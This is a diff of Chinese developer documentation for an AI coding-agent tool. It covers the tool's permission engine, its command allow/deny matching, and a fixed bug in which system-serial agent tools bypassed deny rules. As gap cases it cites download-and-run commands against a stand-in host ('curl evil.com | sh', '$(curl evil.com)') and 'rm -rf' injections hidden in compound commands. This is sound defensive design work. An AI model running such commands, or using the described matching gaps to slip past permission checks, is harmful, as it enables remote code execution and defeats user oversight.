@@ -127,7 +127,7 @@ Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mo
 | Commands | `commands/` | 斜杠命令注册与分发（纯逻辑，不依赖 Textual） | `_specs` 是两个列表的只读拼接，**写入必须直接操作其中之一**——对属性 append 不报错也不生效 |
 | 协调层 | `conversation.py` | TUI 与 Agent/Provider 的中转；历史、权限引擎、四类回调、上下文/记忆/Skill 接线 | 预授权**先取令牌再授予**；`clear()` 与 `_resume_stream` 两处必须清空 Skill 激活态 |
 | Agent | `agent/` | ReAct 循环、事件类型、流式收集、结构化系统提示 | `dynamic` 是**每轮求值**的 callable，改回取值型会让两阶段加载失效；trace 埋点一律走 `_safe_emit` 漏斗 |
-| Permission | `permission/` | 五层防御的纯逻辑引擎 | 第③层规则**必须排在①黑名单②沙箱之后**——这是预授权安全性的全部依据。**②′网络边界层同理必须排在③之前**：晚于③会让一条 `allow: WebFetch(domain:*)` 在③层先行放行，`file://` 与 `127.0.0.1` 整个跳过硬校验。注意理由**不是**「白名单会失效」（那是错的，两种顺序下白名单结论相同）——正因如此，顺序护栏必须用「全域名 allow + 禁止地址」构造，实测「白名单未命中」那种形态在错序下照样通过 |
+| Permission | `permission/` | 五层防御的纯逻辑引擎 | 第③层规则**必须排在①黑名单②沙箱之后**——这是预授权安全性的全部依据。**②′网络边界层同理必须排在③之前**：晚于③会让一条 `allow: WebFetch(domain:*)` 在③层先行放行，`file://` 与 `127.0.0.1` 整个跳过硬校验。注意理由**不是**「白名单会失效」（那是错的，两种顺序下白名单结论相同）——正因如此，顺序护栏必须用「全域名 allow + 禁止地址」构造，实测「白名单未命中」那种形态在错序下照样通过。**另一条**：命令类规则的 deny 与 allow 用一对**语义相反**的判定（`match_command_deep` / `match_command_every_segment`），拆分口径也不同（朴素 / 认引号）——合一或对调任一处都会静默放宽权限，见「成对维护点」 |
 | MCP | `mcp/` | 配置、JSON-RPC、两种传输、工具适配、多 Server 编排 | stdio 的 stderr 必须后台 drain，否则 Server 写日志会把子进程写阻塞 |
 | Memory | `memory/` | 锁原语、RHINE.md 加载、会话存档、笔记与索引 | 写盘权收拢在 manager 的锁临界区内——拿锁的人就是写盘的人 |
 | Hooks | `hooks/` | Hook 规则的解析/条件求值/动作执行/分发编排 | 两条：**Hook 只能收紧不能放宽**（`HookDecision` 里没有 ALLOW，`_apply_hook_ask` 只把 ALLOW 升级为 ASK、绝不降级 DENY）——这是本章全部安全论证的依据；**加锁临界区只做纯内存读写**，动作执行、埋点、跨线程调度一律在锁外，违反会让一个 60 秒超时的命令锁死整个 manager，界面假死而调用栈上无线索 |
@@ -175,6 +175,7 @@ Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mo
 - **新增 `_interact` 的交互种类** → `tui/app.py` 的 `_NOTIFY_KINDS`。两套词汇**刻意不合一**（内部结算标识 vs 写进用户 `hooks.yaml` 的稳定契约，合并会让「改一个内部标识」变成「破坏用户配置」）。漏改不报错，只是那种面板弹出时 `notification` 的 `kind` 退回内部标识，用户按文档写的条件匹配不上
 - **Hook 的 `post_tool_use` / `post_tool_use_failure` 只能挂在 `OUTCOME_EXECUTED` 旁**（`agent/loop.py` 两处）。六种「压根没执行」的分支一个都不能挂——把「没跑」混进「跑了但失败」会让「统计工具失败率」这类用途直接失真，而且不报错。护栏见 `tests/test_hook_intercept.py::NoExecutionBranchesTest`
 - **新增系统提示槽位** → `agent/prompt/modules.py` 的 `optional_slots` + `agent/prompt/builder.py` 的参数与 `_FILLED` 元组。**漏改 `_FILLED` 不报错**，只是那个槽位会被添加两次（一次填了内容、一次是空槽）。另：进稳定通道的槽位**按「越稳定越靠前」排序**——前缀缓存是「从第一处变化起全部失效」，故 c13 的角色清单是 135、排在会随 `/skills reload` 变化的 Skill 清单（140）之前
+- **命令匹配的两对函数刻意成对出现，别合一也别对调** → `permission/matching.py` 的 `match_command_deep`（任一段命中，**收紧侧**）↔ `match_command_every_segment`（每段都命中，**放行侧**），以及 `split_commands`（朴素，**收紧侧**）↔ `split_commands_quoted`（认引号，**放行侧**）。调用点在 `permission/rules.py` 的命令分支（deny 一支 / allow 一支）与 `hooks/conditions.py`（只用收紧侧那对）。⚠ **判据只有一条：拆段与拆分的效果必须朝「更严」走。** deny 那边「多命中一次」= 多拦一次；allow 这边「多命中一次」= 少弹一次确认面板——两侧要的正好相反。**四种改错方式全都不报错**：把 allow 换成 `match_command_deep` → 一条 `allow: Bash(git status)` 开始放行 `git status && rm -rf x`；把 deny 换成 `match_command_every_segment` → `deny: Bash(git push *)` 拦不住复合命令；把引号感知搬进 `split_commands` → **放宽①危险命令黑名单**（`git commit -m "a; rm -rf x"` 从 DENY 变成放过）；给 `split_commands_quoted` 去掉「引号未闭合退回朴素拆分」→ 一个落单的引号就能把分隔符全藏起来、末尾通配跨分隔符那个缺口原样复现。另：allow 侧的**跨规则**求值在 `RuleSet._combined_command_allow`，不在 `_rule_matches`（后者只看得见一条规则）——少了它，`allow: Bash(git *)` + `allow: Bash(ls *)` 会让 `ls && git status` 开始弹面板。护栏见 `tests/test_perm_matching.py` 与 `tests/test_perm_rules.py::CompoundCommandTest`（两个方向的反证都在）
 - 新增工具 → `tools/registry.py`（注册）+ `permission/adapter.py`（权限映射，按需）+ 若要在 `allowed-tools` 里可写，还要在 `skills/validation.py` 的 `_TOOL_ALIASES` 加一行
 - **改动 Skill 清单表头或 `load_skill` 的工具描述** → `skills/render.py` 的 `_INDEX_HEADER` + `tools/load_skill.py` 的 `description`。**两处必须同口径**（命中就先加载 / 替代默认做法 /用户不必点名 / 拿不准就加载）——它们是模型决定「要不要用 Skill」时读的**唯一两处文本**，一处强一处弱等于白改。⚠️ 那句「替代你自己的默认做法」不可省：少了它，模型会把 Skill 当成「另一种可选做法」而不是「该走的那条路」。两处各有护栏（`test_skill_render.py` / `test_skill_manager.py`）
 - **新增一项 Skill 体检检查** → `skills/models.py` 的 `AdviceKind`（枚举）+ `skills/audit.py`（判定与措辞）。**漏了枚举不报错**，只是那条新检查在测试里没法精确断言，用例只能退回 `assertIn("某个词", report)` 这种脆弱写法——而措辞恰恰是这类建议要反复打磨的东西，改一次碎一批测试，人的第一反应会是把断言放宽成谁都能过
@@ -206,12 +207,12 @@ Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mo
 - **工具主动裁剪了 `output` → 必须同时填 `full_output`（trace 完整性）** → `tools/base.py` 的 `ToolResult.full_output` + 该工具的 `execute`。Hook 侧同型：`ActionOutcome.full_detail`。**漏填不报错**，只是那段内容**永久消失且无人察觉**——记录看起来是完整的，因为被裁掉的地方连痕迹都没有（`_clip` 留下的「…（省略中间 k 行）…」是给模型看的提示，它不告诉你被省掉的**内容**是什么）。目前唯二的填写方是 `run_command`（前 30 + 后 10 行）与 `hooks/actions.py`（`DETAIL_LIMIT`）。⚠️ **这两处的裁剪本身要保留**：它们省的是模型的 token 预算，删掉会让一次 `pytest` 输出撑爆上下文。护栏见 `tests/test_trace_full_output.py`
 - **子 Agent 每一种「开始运行」都要经 `_emit_start`（c15）** → `subagents/runner.py` 现在有**两个**调用点：首轮委派与**被消息唤醒的续跑轮**（`kind=wake`）。**漏一个不报错**，只是记录里出现「一条 `subagent_end` 找不到对应的 start」——真实模型验收撞到过：一个队员被叫醒两次，时间线上 1 条 start 配 3 条 end，而 `_next_round_record` 每轮发新 `task_id`，读的人对不上号。比对不上号更要紧的是**那一轮的运行条件（工具集 / 权限档 / 工作目录）一处都没记**。抽成一份函数正是为了防同一个坑的下一次：两处各拼一次负载的话，将来给 start 加字段必然只加到一处。护栏见 `tests/test_team_wake.py::WakeTraceTest`（含「不能只补空壳事件让计数配平」的第二条）
 - **给 `screen` 加取文本的路径 → 先拆包、再判断是不是 Rich 可渲染对象（c15 设施）** → `tests/e2e/control.py` 的 `_plain_text_of` / `_painted_text_of`。两个坑都实测过：① **`RichVisual` 不是 Rich 可渲染对象**，丢给 `console.print` 不报错、Rich 用 `Pretty` 打出它的 repr，于是「捕获成功」而内容是 `RichVisual(Static(), <Group object at 0x…>)`——**一个看起来像内容的字符串**，判据若是 `assertNotIn` 会**通过**（观测设施返回 repr 比返回空串危险得多，所以取不出来一律返回空串）；② **`Input` / `OptionList` 按行绘制**（实现 `render_line` 而不是 `render()`），它们的 `render()` 返回 Panel 外壳，只看 `render()` 会拿到一串 `╭───────`。因此逐行读优先，并分出 `text`（画出来的、会折行）与 `content`（逻辑内容、不折行）两份——**内容断言必须用后者**，否则会失败在折行位置这种与判据无关的地方
-- **trace 埋点新增字段 → 同步 `trace/reader.py` 的摘要函数** → 新字段若不进摘要行，读时间线的人就看不见它，只有 `--seq` 展开才发现「原来早就记了」。**漏改不报错**，代价是那个字段等于白记。本轮加的四项都进了摘要：`permission_decision.bypassed_engine`（标 ⚠绕过引擎）、`subagent_start` 的 `member`/`isolated`/`permission_mode`、`worktree_create.path`。判断标准是「排查时第一眼要不要看到它」——要就进摘要行，不要就只留在负载里（`tool_execute.cwd` 就没进，它每条都一样、进去只会挤掉真正有信息量的部分）
+- **trace 埋点新增字段 → 同步 `trace/reader.py` 的摘要函数** → 新字段若不进摘要行，读时间线的人就看不见它，只有 `--seq` 展开才发现「原来早就记了」。**漏改不报错**，代价是那个字段等于白记。本轮加的四项都进了摘要：`permission_decision.ask_downgraded`（标 ⚠ASK已降级）、`subagent_start` 的 `member`/`isolated`/`permission_mode`、`worktree_create.path`。判断标准是「排查时第一眼要不要看到它」——要就进摘要行，不要就只留在负载里（`tool_execute.cwd` 就没进，它每条都一样、进去只会挤掉真正有信息量的部分）
 - **写多 Agent（C13/C15）的端到端剧本 → 必须用 `ScopedScriptedProvider`，且等待要用 `--until quiescent`** → `tests/e2e/scripted.py` + `tests/e2e/control.py`。两处都是「用错了不报错、只是判据变成竞态的」：①`ScriptedProvider` 按**全局调用序号**取轮次，而队员并发跑，同一份剧本每次跑可能对应到不同 Agent 身上；②`wait` 缺省的 `terminal` 只看界面，后台委派在跑或有消息等自动唤起时界面照样 `idle`，一秒后又忙起来。**竞态判据比没有判据更坏——它偶尔通过。** 另：剧本里作用域键取的是 `run_agent` 的 `name`（队员名）**不是角色名**，同一个角色可以派出多个队员。护栏见 `tests/test_e2e_team_scripts.py`
 - **改动发消息工具的描述或注入消息的标记块（c15）** → `tools/send_message.py` 的 `description` + `team/render.py` 的 `render_incoming`。**两处必须同口径**（你的正文别人看不到 / 消息自动送达不必查收 / 按名字指代 / 名字在它干完之后依然有效）——模型在**两个不同时刻**读到同一条约定：发消息前读工具描述、收消息时读标记块，一处强一处弱等于白改。这与 C11 的「Skill 清单表头 ↔ `load_skill.description`」、C13 的「角色清单 ↔ `run_agent.description`」、C14 的「交付信息 ↔ 委派工具描述」是**同一个坑的第四次**，前三次都是真实模型实测才发现的。护栏见 `tests/test_team_tools.py::SameVoiceTest`
 - **任务的 `blocked_by` 与 `blocks` 是双向冗余存储（c15）** → `team/board.py` 的 `add_dependency` / `remove` 两处都要成对维护。只存一边的话每次列清单都要遍历全表反查，而清单是每个队员每一轮都可能读的高频操作。⚠ `remove` 漏摘反向引用的后果最隐蔽：留下**指向不存在任务的悬空依赖**，而 `is_blocked` 把查不到的前置按「未完成」处理——那条任务**再也认领不了**，且清单上显示的阻塞来源是一个查无此条的编号
 - **队员的两套状态刻意分开（c15）** → C13 的 `TaskStatus`（这次委派的**结论**产出了没有）与 `team/models.py` 的 `MemberState`（**人**还在不在场、叫不叫得醒）。⚠ **绝不要给 `TaskStatus` 加一个 `is_terminal` 为假的 `IDLE`**：主 Agent 的闸门用 `not status.is_terminal` 判断「还要不要等」，加了之后它每次收工都会去等一个已经待命的队员，而那个队员正等着主 Agent 给它发消息——**双方互等，永远结束不了**。护栏见 `tests/test_team_wake.py::test_main_agent_can_finish_while_a_member_idles`
-- **协作工具刻意不进两张表（c15）** → `subagents/toolset.py` 的 `GLOBAL_DENIED_TOOLS`（F22 要求它们对全部子 Agent 可见）与 `permission/adapter.py` 的 `_TOOL_MAP`（它们不碰文件也不执行命令，没有可映射的语义；⚠ 但登不登记对它们都不生效——`system_serial` 的工具压根不进引擎，见安全边界 c15 ①）。两处都写了「刻意」的说明，别当成漏改顺手补上；而 `run_agent` / `load_skill` **必须继续留在禁表内**——C15 只让队员能说话，没有让它们能招人
+- **协作工具刻意不进两张表（c15）** → `subagents/toolset.py` 的 `GLOBAL_DENIED_TOOLS`（F22 要求它们对全部子 Agent 可见）与 `permission/adapter.py` 的 `_TOOL_MAP`（它们不碰文件也不执行命令，没有可映射的语义；⚠ 不登记的实际后果是它们落 `other` 分支，只被**不带括号的整工具规则**命中——`deny: send_message` 生效，`deny: send_message(*)` 不生效）。两处都写了「刻意」的说明，别当成漏改顺手补上；而 `run_agent` / `load_skill` **必须继续留在禁表内**——C15 只让队员能说话，没有让它们能招人
 - 新增 trace 事件类型 → `trace/models.py`（`TraceEventType` 枚举）+ `trace/reader.py` 的 `SUMMARIZERS`「type → 摘要函数」表（**漏了不报错**，只会让新事件在阅读器里显示成「（未登记类型）」——那句话就是为暴露这个遗漏而刻意保留的）
 - `bootstrap.build_app` 的装配顺序 → 那段「位置为什么卡在这个窄窗口里 / 两头都不能挪」的理由注释**必须随代码走**；迁代码留注释等于把知识丢了。**窗口里现在只剩一件事**：P1a 的 `exclude_tools` 摘除，理由是「往后挪会让 `session_start` 快照与实际工具集不符」。另半件（C11 的 Skill 白名单 fail-fast）已随对齐改造删除——`allowed-tools` 现在认不出的项只警告不终止，`bootstrap.py` 里留着那段删除说明，别再照着它推理
 - 新增控制通道指令 → `tests/e2e/protocol.py`（取值/错误码）+ `control.py`（`DriverCore` 方法）+ `host.py` 的 `dispatch` 分支 + `client.py`（子命令）+ `test_e2e_control.py`（**五处齐改，漏一处是静默失效**：客户端能发但宿主不认、或宿主认了但没人调得到）
@@ -350,7 +351,7 @@ python -m unittest discover -s tests      # 2279 项，skipped 4
 
 1. **危险命令黑名单**（`permission/blacklist.py`）：正则拦截 `rm -rf` / `git push --force` / fork 炸弹 / `format`、`Remove-Item -Recurse -Force` 等已知高危命令，复合命令逐段+整条双重检查；**不可被任何配置或权限模式放开**。
 2. **路径沙箱**（复用 `path_guard`）：文件、glob、grep 工具以启动时的当前工作目录为项目根；拒绝含 `..`、解析后越界的绝对路径、指向项目外的符号链接。
-3. **可配置规则**：三层 YAML 的 allow/deny，deny 永远优先。命令类规则里 **deny 走「整条 + 逐段」**（与①同口径，一个 `&&` 藏不住东西），**allow 只匹配整条**——拆段只会让命中变多，用在放行侧就是提权。⚠ 但 allow 侧另有一个未修的缺口（末尾通配跨分隔符），见「已知后续工程项」第 12 条。
+3. **可配置规则**：三层 YAML 的 allow/deny，deny 永远优先。命令类规则的两侧用**一对语义相反**的判定，这个不对称是刻意的：**deny 走「整条 + 任一段」**（与①同口径，一个 `&&` 藏不住东西），**allow 走「每一段都得命中」**（每段可由**不同**的 allow 规则覆盖）。判据只有一条——拆段的效果必须朝「更严」走：deny 那边多命中一次是多拦一次，allow 这边多命中一次是少弹一次面板。把任一侧换成对面那个函数都会静默放宽权限。⚠ 两侧的**拆分口径也不同**：allow 侧认引号（`split_commands_quoted`），①与 deny 侧仍是朴素拆分——把引号感知搬进后者等于放宽①黑名单。
 4. **权限模式**（`/perm`）：严格/默认/放行，只兜底「规则未命中」的灰色地带，翻不了①②③的 deny。
 5. **人在回路**：判定为「问用户」时弹确认面板，四选项（本次/本会话/永久/拒绝）。
 
@@ -374,9 +375,15 @@ python -m unittest discover -s tests      # 2279 项，skipped 4
   权限档位取 `min(主对话档, 角色声明档)`，**声明放行档不产生任何提权效果**；
   判 ASK 一律自动拒绝；**不继承回合级预授权**（Skill `allowed-tools` 授予的那种）。
   因此「模型能不能委派」不需要单独设闸——它委派出去也做不了自己直接做不了的事。
-  ② **委派工具本身不进权限管线**（`system_serial=True`，与 `load_skill` 同先例）。
-  委派动作本身无副作用；副作用全部来自子 Agent 调用的工具，那些**逐个**过完整五层
-  管线 + Hook 前置层，一道都不少。
+  ② **委派工具不弹确认面板，但仍过权限引擎**（`system_serial=True`，与 `load_skill`
+  同先例）。委派动作本身无副作用；副作用全部来自子 Agent 调用的工具，那些**逐个**
+  过完整五层管线 + Hook 前置层，一道都不少。
+  ⚠ `system_serial=True` 精确地只意味着两件事：**强制串行** + **引擎判 ASK 时按
+  ALLOW 处理**（不弹面板——它可能开一整条子对话，在预扫处等面板会拧死交互链）。
+  它**不**意味着「不进权限管线」：`deny: run_agent` 这条不带括号的整工具规则
+  **拦得住它**。此处一度写着「不进权限管线」，那对应一个从 C13 起就存在、
+  C15 验收期实测戳穿的真实缺陷（预扫直接给 ALLOW、根本不调引擎），
+  已于 perm-system-serial-bypass 修掉。
   ③ **项目级 `.rhinecode/agents/` 随代码仓库分发**，`git clone` 一个仓库再启动就可能
   多出几个主 Agent 可委派的角色。因此**每次启动都提示**（刻意不做持久化——有状态的话
   `git pull` 新拉进来的会被静默吞掉）。危险程度比 C12 的项目级 `hooks.yaml` **低一个量级**
@@ -422,13 +429,17 @@ python -m unittest discover -s tests      # 2279 项，skipped 4
   `.gitignore`，勿提交。另：**环境初始化只按显式清单执行、不做任何启发式**——
   自动识别会把含明文 API Key 的 `config.yaml` 复制进多个临时目录。
 - **子 Agent 协作（c15）六条**：
-  ① **协作工具不进权限管线**（`system_serial=True`，与 `run_agent` / `load_skill`
+  ① **协作工具不弹确认面板**（`system_serial=True`，与 `run_agent` / `load_skill`
   同先例）。它们不读写文件、不执行命令，副作用限于改本进程内存里的清单与信箱，
   没有可映射的 Bash / Read / Edit / Write 语义。
-  ⚠ **`deny` 规则对它们无效**——`system_serial=True` 的工具在预扫里直接拿到
-  ALLOW、根本不调 `engine.decide`（c15 验收期实测确认，`run_agent` / `load_skill`
-  同样如此，那是个既有错误）。**唯一有效的收窄手段是 Hook 的 `pre_tool_use`**，
-  见「已知后续工程项」那条。
+  它们**仍然过一次 `engine.decide`**，只是判 ASK 时按 ALLOW 处理（不弹面板）。
+  因此想整个禁掉它们，写 `deny: send_message` / `deny: task_*` 即可
+  ——⚠ 必须是**不带括号**的整工具形式，`deny: send_message(*)` 不命中
+  （它们落 `other` 分支，那个分支只认空模式，这是 c7 起的既有语义）。
+  另有一条独立且更早的收窄手段：Hook 的 `pre_tool_use`（它排在权限管线之前）。
+  ⚠ 此处一度写着「`deny` 规则对它们无效」，那是 C15 验收期实测确认的**真实缺陷**
+  （预扫直接给 ALLOW、根本不调引擎，`run_agent` / `load_skill` 同样如此），
+  已于 perm-system-serial-bypass 修掉。
   ② **「能让别人干活」不等于提权。** 队员发消息唤醒另一个队员去做事时，
   那个队员做的每一件事仍逐个过完整的五层管线 + Hook 前置层，且它的工具集与
   权限档在委派时就已按 C13 的规则收窄过。本章**不引入任何绕过管线的通路**。
@@ -485,31 +496,39 @@ python -m unittest discover -s tests      # 2279 项，skipped 4
 10. Trace 记录器后续项（spec 明确不做）：TUI 驱动器（P1，用 Pilot 无人驱动界面跑完整场景，本轮只做 P0 记录器）、记录文件的自动清理与轮转（`--trace` 每次运行产一个新文件，攒多了要手工删）、实时流式查看（当前只能事后读文件）、可视化时间线、跨运行对比与差异分析、采样与按类型开关（当前只有「全开」与「全关」两态）。~~阈值（字段截断 4000 字符 / 消息条数 400）可配置化~~ **已于 2026-08-09 作废**——两个阈值整体删除，记录层不再做任何截断（`models.full_text`）。理由是它们与 trace 的立项目的直接冲突：实测系统提示在最小配置下已有 3886 字符、贴着 4000 线，而稳定通道尾部依次是 134 组队协作 / 135 角色清单 / 140 Skill 清单——任何一份真实的 RHINE.md 一进来，被切掉的正好是那三段清单。代价是记录文件更大（`api_request` 每轮含完整历史），这是刻意付的。
 11. 记忆系统后续项（C9 spec 明确不做）：向量数据库/RAG 语义检索（召回只靠索引注入 + 按路径读文件）、团队记忆同步/跨机器共享、跨实例实时一致性（锁只保证「写不坏」，语义重复笔记靠 LLM 去重收敛）、笔记自动清理与遗忘机制、各阈值（24h 提醒/30 天过期/索引 200 行/锁 600 秒等）可配置化、存档格式版本迁移工具、存档加密或压缩存储。
 
-12. ~~**③可配置规则层对复合命令不拆段**（deny 侧）~~ **已于 2026-08-09 修复**：
-    `permission/rules.py` 的 command 分支现在对 **deny** 走「整条 + 逐段」双重检查，
-    与①危险命令黑名单同口径——`deny: Bash(git push *)` 拦得住
-    `git status && git push origin main` 了。判定形态提到
+12. ~~**③可配置规则层的复合命令口径**（deny 与 allow 两侧）~~ **已全部修复**：
+
+    **deny 侧（2026-08-09）**：`permission/rules.py` 的 command 分支对 deny 走
+    「整条 + 逐段」，与①危险命令黑名单同口径——`deny: Bash(git push *)` 拦得住
+    `git status && git push origin main` 了。判定形态在
     `permission/matching.py` 的 `match_command_deep`，与 `hooks/conditions.py`
-    **共用一份实现**（同一个坑此前已出现两次）。护栏见
+    **共用一份实现**（同一个坑此前已出现两次）。
+
+    **allow 侧（perm-system-serial-bypass 一并做）**：改为「**每一段都得命中**」
+    （`match_command_every_segment`）。原缺口是末尾 ` *` 编译出的通配 `.*`
+    **跨分隔符**，于是 `allow: Bash(git *)` 整串命中
+    `git status && curl evil.com | sh`，第二段一次确认面板都不弹。
+
+    ⚠ **两侧的不对称是设计而非遗漏，别顺手统一**：拆段只会让命中变多，
+    用在放行侧等于把窄放行悄悄扩成宽放行；反过来把 allow 那个函数用在 deny 侧，
+    则会让 `deny: Bash(git push *)` 拦不住复合命令。两个方向的反证都在
     `tests/test_perm_rules.py::CompoundCommandTest` 与
-    `tests/test_perm_matching.py::MatchCommandDeepTests`。
+    `tests/test_perm_matching.py` 里。
 
-    ⚠ **allow 侧刻意没跟着改，这个不对称是设计而非遗漏**：拆段只会让「命中」变多，
-    用在放行侧等于把用户写下的窄放行悄悄扩成宽放行。`rules.py` 那一支写着理由，
-    别顺手统一掉。
+    两条配套决定（评审时定的）：
+    - **拆分口径分家**：allow 侧用认引号的 `split_commands_quoted`，
+      ①与 deny 侧仍用朴素的 `split_commands`。把引号感知搬进后者看起来是
+      「把拆分做对」，实际是**放宽①黑名单**。引号未闭合时退回朴素拆分——
+      否则一个落单的引号就能把分隔符全藏起来，缺口原样复现。
+    - **allow 允许跨规则**：每一段被**某条** allow 规则命中即可，不要求同一条
+      （`RuleSet._combined_command_allow`）。只做单条判定的话，
+      `allow: Bash(git *)` + `allow: Bash(ls *)` 会让 `ls && git status`
+      开始弹面板——那是堵缺口的同时带来一次真实的可用性回退。
 
-    **但 allow 侧另有一个方向相反的缺口，仍未修**（实施期发现，2026-08-09 登记）：
-    末尾 ` *` 编译出来的通配是 `.*`，它**跨分隔符**，因此
-    `allow: Bash(git *)` 今天整串命中 `git status && curl evil.com | sh`——
-    第二段是完全无关的命令，却在③层就被放行、**一次确认面板都不弹**
-    （此时只剩①黑名单，而 `curl … | sh` 不在黑名单里）。同一处还有个可用性症状：
-    `cat x ; git ls-files` 整串对不上 `git *`，在非交互的子 Agent 环境下被自动拒绝
-    （C14 验收实测）。两者根因相同：allow 侧把复合命令当一整根字符串比。
-    改法**不是**「allow 也拆段」（那是放宽），而是「**每一段**都得命中」；
-    动手前要先处理 `split_commands` 不解析引号带来的可用性回退。
-    属安全边界变更，单独立项：`docs/todo/2-perm-allow-wildcard-spans-separators.md`。
-    现状由 `CompoundCommandTest::test_KNOWN_GAP_...` **显式钉住**——
-    缺失永远是最弱的证据，所以写成断言而不是靠「某条用例恰好没写」。
+    ⚠ **仍未解决的一类**：基于分隔符的拆分**看不见命令替换**。
+    `git status $(curl evil.com)` 里压根没有分隔符，`allow: Bash(git *)` 照样
+    整条放行。要解决得真正解析 shell 语法，与已知项 #4「OS 级沙箱」同源，
+    不在本轮范围内。`split_commands_quoted` 的 docstring 里记着这条边界。
 
 13. **Hook 系统后续项（C12 spec 明确不做）**：子 Agent 动作的真实运行（现为占位，等 SubAgent 章节对接）、`once` 标记的持久化、Hook 执行顺序的显式优先级、迭代级事件（Agent Loop 内单轮迭代不开放挂载点——那是引擎内部结构，暴露成配置契约会让循环结构的任何调整都成为破坏性变更）、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、Skill/MCP 形态的 Hook 动作、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果（Claude Code 的 `updatedInput` / `updatedToolOutput`）。
 
@@ -578,39 +597,42 @@ python -m unittest discover -s tests      # 2279 项，skipped 4
 
     未排除的一项：本次用的是 `deepseek-v4-flash`（快速小模型），
     指令遵循弱于同系列大模型，**换强模型复测尚未做**。
-    详见 `docs/c15/acceptance/live-model.md`；**已登记为 `docs/todo/6-team-adoption.md`**
+    详见 `docs/c15/acceptance/live-model.md`；**已登记为 `docs/todo/4-team-adoption.md`**
     （⚠ 那份的第一步不是改代码，是换强模型跑对照）。
 
-18. **`system_serial=True` 的工具绕过③可配置规则层**（C15 验收期实测发现，
-    2026-08-09 登记，**未修**）：`agent/loop.py` 的决策预扫里，
-    `if tool.system_serial:` 分支**直接给一个 ALLOW 决策并 `continue`**，
-    根本不调 `engine.decide`。因此 `permissions.yaml` 里写的
-    `deny: run_agent` / `deny: send_message` / `deny: task_update`
-    **一条都不生效**——实测：配了 deny 规则之后消息照样送达。
+18. ~~**`system_serial=True` 的工具绕过③可配置规则层**~~
+    **已于 perm-system-serial-bypass 修复**（C15 验收期实测发现、2026-08-09 登记）：
 
-    影响 7 个工具：`run_agent`、`load_skill`、以及 C15 的五个协作工具。
+    `agent/loop.py` 的决策预扫里，`if tool.system_serial:` 分支**直接给一个 ALLOW
+    决策并 `continue`**，根本不调 `engine.decide`。因此 `permissions.yaml` 里写的
+    `deny: run_agent` / `deny: send_message` / `deny: task_update` **一条都不生效**
+    ——实测：配了 deny 规则之后消息照样送达。影响 7 个工具：`run_agent`、
+    `load_skill`、以及 C15 的五个协作工具。
 
-    **唯一仍然有效的收窄手段是 Hook 的 `pre_tool_use`**（那一层排在预扫更前面，
-    实测拦得住）。危险性有限——这些工具本身不读写文件、不执行命令，
-    副作用限于起子对话或改进程内存；真正有副作用的是它们**引发**的工具调用，
-    而那些逐个过完整五层管线。但**文档一度承诺了「仍可被 deny 规则整个禁掉」，
-    那是错的**，错误的安全承诺比没有承诺更危险，相关四处注释已在 C15 修正。
+    危害不在「这些工具很危险」（它们不读写文件、不执行命令），而在于**文档从 C13
+    起一直承诺「仍可被 deny 规则整个禁掉」，那是错的**。用户照着写一条规则会以为
+    自己关掉了委派能力，实际没有，且界面上完全看不出来。
+    **错误的安全承诺比没有承诺更危险。**
 
-    修的话要动 `agent/loop.py` 那一个分支：让 `system_serial` 的工具也过一次
-    `engine.decide`，只是把 ASK 结果当 ALLOW 处理（保住「它们不弹面板」这条
-    既有性质）。这会改变 C13 起的既有行为（`deny: run_agent` 突然开始生效），
-    属安全边界变更，应当单独立项、单独评审，并补「deny 生效」与
-    「仍然不弹面板」两条护栏。
+    修法：那七个工具现在**照常过一次 `engine.decide`**，但**判 ASK 时按 ALLOW
+    处理**——保住「这类工具不弹确认面板」这条既有性质（它们可能开一整条子对话，
+    在预扫处停下来等面板会把交互链拧成死结）。净效果只有一条：**DENY 现在拦得住了**。
+    Hook 的 ASK 仍照常升级为面板：④是灰色地带的兜底，而 Hook 的 ASK 是用户针对
+    这件事写下的规则，两者刻意区别对待。
 
-    **2026-08-09 补了观测面，判定行为一字未改**：那个分支现在会照常产出一条
-    `permission_decision`，带 `bypassed_engine=True`，`reason` 明说
-    「未经权限引擎、③层 deny 对它不生效、唯一收窄手段是 Hook 的 pre_tool_use」，
-    阅读器在时间线上标 ⚠。此前**它一条判定记录都没有**，于是这个 bypass
-    只能靠「少了一条」去反推——而缺失永远是最弱的证据。
-    护栏见 `tests/test_trace_system_serial.py`，其中
-    `test_every_tool_execution_is_preceded_by_a_decision` 正是改造前
-    写不出来的那条通用不变量（七个系统级工具会让它恒假）。**已登记为 `docs/todo/1-perm-system-serial-bypass.md`**
-    （与第 12 条同源，建议一起做）。
+    ⚠ 规则必须写成**不带括号**的整工具形式。这些工具落 `other` 分支，
+    那个分支只认空模式——`deny: send_message` 生效，`deny: send_message(*)` 不生效
+    （c7 起的既有语义，非本次引入）。工具名通配照常可用：`deny: task_*`。
+
+    trace 侧同步：原先标「绕过引擎」的 `bypassed_engine` 字段随之作废，
+    换成 **`ask_downgraded`**（阅读器标 ⚠ASK已降级）。不换的话那个字段会恒为假、
+    阅读器的记号永不出现；而 ASK 被降级这件事**必须可见**——只记
+    `allow（④模式）` 的话，读的人会以为用户切到了放行档。
+
+    护栏：`tests/test_perm_system_serial.py`（遍历七个工具逐个断言 deny 命中）、
+    `tests/test_team_tools.py::SystemSerialPermissionTest`（deny 生效 / 仍不弹面板 /
+    Hook 仍能拦 / Hook 的 ASK 仍弹面板）、`tests/test_trace_system_serial.py`
+    （每条 tool_execute 前都有判定 + 降级可见）。
 
 19. **子 Agent 协作后续项（C15 spec 明确不做）**：跨机器 / 分布式团队、
     成员间实时流式通信、队员之间互相委派（无限嵌套招人）、任务清单与花名册的
